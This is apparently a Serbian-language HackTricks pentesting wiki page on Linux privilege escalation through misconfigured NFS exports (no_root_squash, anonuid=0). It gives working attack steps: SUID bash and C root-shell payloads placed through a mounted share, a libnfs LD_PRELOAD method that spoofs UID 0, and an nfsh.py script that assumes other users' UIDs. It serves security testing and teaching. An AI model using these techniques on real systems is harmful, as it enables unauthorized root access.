# Eskalacija privilegija zbog pogrešne konfiguracije NFS-a sa `no_root_squash`

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije o squashingu

Kod NFS AUTH_SYS/AUTH_UNIX, server zasniva provere dozvola za fajlove na vrednostima `uid` i `gid` navedenim u svakom RPC zahtevu. Drugi bezbednosni mehanizmi, kao što je Kerberos, koriste drugačije kredencijale, a server može mapirati numeričke kredencijale pre provere dozvola.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Mapira svaki UID i GID na anonimni nalog, koji je na Linuxu podrazumevano `nobody` (65534). `no_all_squash` je podrazumevana vrednost za zahteve koji nisu root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Ovo je podrazumevana vrednost na Linuxu i mapira zahteve sa UID/GID 0 (root) na anonimni nalog; ostali UID-ovi i GID-ovi se ne mapiraju.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Isključuje root squashing, pa se zahtevi sa UID/GID 0 mogu na serveru proveravati kao root.<sup>[[4]](#references)</sup>

Ako klijent kome je pristup dozvoljen može da montira eksport sa dozvolom za pisanje u **`/etc/exports`**, konfigurisan sa **`no_root_squash`**, njegovi zahtevi sa UID/GID 0 mogu da upisuju u njega kao root korisnik servera.<sup>[[4]](#references)</sup>

`root_squash` mapira samo UID/GID 0; uz AUTH_SYS, **nenulti numerički UID/GID** klijenta kome je pristup dozvoljen i dalje može da odgovara drugom nalogu na serveru. Zato eksport sa dozvolom za pisanje može postati putanja za pristup kao drugi korisnik čak i uz root squashing, ako klijent može da kreira fajl koristeći taj numerički identitet, a server dozvoljava pristup. Kod SUID/SGID handoff-a proverite i vlasnika dobijenog fajla, dozvole za izvršavanje, stanje `nosuid` na montiranom fajl-sistemu servera, ACL-ove i SELinux ili druga pravila. Sama putanja do eksporta, opcija `rw` ili podudaranje numeričkog ID-a ne dokazuju da je klijentu pristup dozvoljen, da je eksport aktivan niti da oba hosta koriste isto efektivno mapiranje identiteta. Pasivno pregledajte `/etc/exports` i lokalne metapodatke; tokom enumeracije nemojte montirati novi share niti kreirati probni fajl.<sup>[[4]](#references)[[5]](#references)</sup>

Više informacija o **NFS-u** potražite na:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Eskalacija privilegija

### Mapiranje na anonimni nalog sa privilegijama ekvivalentnim root-u

Nemojte proveravati samo `no_root_squash`. Uz `root_squash,anonuid=0,anongid=0`, zahtev klijenta sa UID/GID 0 se mapira **nazad na root**. Uz `all_squash,anonuid=0,anongid=0`, čak se i identiteti klijenta koji nisu root mapiraju na root na serveru. Na eksportu `sec=sys` sa dozvolom za pisanje, obe konfiguracije mogu omogućiti kreiranje fajla u vlasništvu root-a, što je osnova za SUID handoff opisan ispod; i dalje važe ograničenja u vezi sa klijentima kojima je pristup dozvoljen i montiranjem na žrtvi.<sup>[[4]](#references)</sup>

Na serveru koristite `exportfs -v` da biste pregledali aktivni eksport i opcije za **odgovarajućeg klijenta**, uključujući `rw`, `sec=`, režim squashinga i `anonuid`/`anongid`. Prilikom pregleda konfiguracije proverite i `/etc/exports.d/*.exports`; samo `/etc/exports` možda ne sadrži sve informacije.<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Remote Exploit

Opcija 1 pomoću bash-a:
- Na dozvoljenom klijentu, kao root montirajte export sa dozvolom za upis, kopirajte **`/bin/bash`** u njega, postavite njegov **SUID** bit i izvršite ga sa mount-a žrtve koji ne koristi `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Da bi otpremljena datoteka ostala u vlasništvu root-a, server mora da sačuva UID klijenta 0 pomoću **`no_root_squash`** ili da mapira zahtev na UID 0 pomoću **`anonuid=0`**. U suprotnom, SUID binarna datoteka za drugi nalog moguća je samo ako klijent može da je kreira ili da je poseduje koristeći numerički UID/GID tog naloga.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 using compiled C code:
- Montirajte direktorijum sa dozvoljenog klijenta, kopirajte kompajlirani payload koji zloupotrebljava SUID dozvole, postavite njegov **SUID** bit i izvršite ga sa žrtve (pogledajte neke [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Ista ograničenja kao ranije

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Lokalni Exploit

> [!TIP]
> Imajte na umu da, ako možete da napravite **tunel sa svoje mašine do mašine žrtve, i dalje možete da iskoristite Remote verziju za ovu eskalaciju privilegija tunelovanjem potrebnih portova**.\
> Sledeći trik je koristan kada `/etc/exports` ograničava export na IP adresu žrtve: udaljeni klijent ne može da ga mountuje, ali lokalna tehnika može da radi preko share-a koji je već mountovan na dozvoljenom hostu.<sup>[[2]](#references)</sup>\
> Za ovu neprivilegovanu libnfs metodu, export u **`/etc/exports`** mora da koristi oznaku `insecure` kako bi proces mogao da koristi izvorni port koji nije rezervisan; `secure` je podrazumevano podešavanje, ali proces koji može da se veže za rezervisani port ne zahteva ovu opciju.<sup>[[1]](#references)[[4]](#references)</sup>

### Osnovne informacije

NFSv3 AUTH_UNIX klijent uključuje svoj efektivni UID, GID i grupe u svaki poziv, a server ih koristi za proveru dozvola. Ova lokalna tehnika zloupotrebljava taj model tako što falsifikuje RPC akreditive preko [libnfs](https://github.com/sahlberg/libnfs); njegov preload modul podržava prepisivanje UID/GID vrednosti u NFS kontekstu.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kompajliranje biblioteke

Primer za libnfs može zahtevati prilagođavanja za ciljno jezgro; u ovde korišćenom vodiču izričito se navodi da pre kompajliranja preload modula treba zakomentarisati fallocate syscall-ove.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Izvođenje Exploita

Primer kreira mali pomoćni C program koji pokreće shell, zatim ga postavlja na share i koristi `ld_nfs.so` sa UID 0 u NFS kontekstu da bi ga učinio SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Kompajlirajte exploit kod:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Postavite exploit na deljeni resurs i izmenite njegove dozvole lažiranjem UID-a**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Pokrenite exploit da biste stekli root privilegije**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell za prikriveni pristup fajlovima

Kada se dobije root pristup, ovaj obrazac `nfsh.py` postavlja efektivni UID na UID ciljnog fajla pre pokretanja komande, što omogućava pristup bez rekurzivne promene vlasništva.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Pokreni kao:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Priča o manje poznatom NFS privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — stranica Linux priručnika](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Specifikacija protokola NFS verzije 3](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — stranica Linux priručnika](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
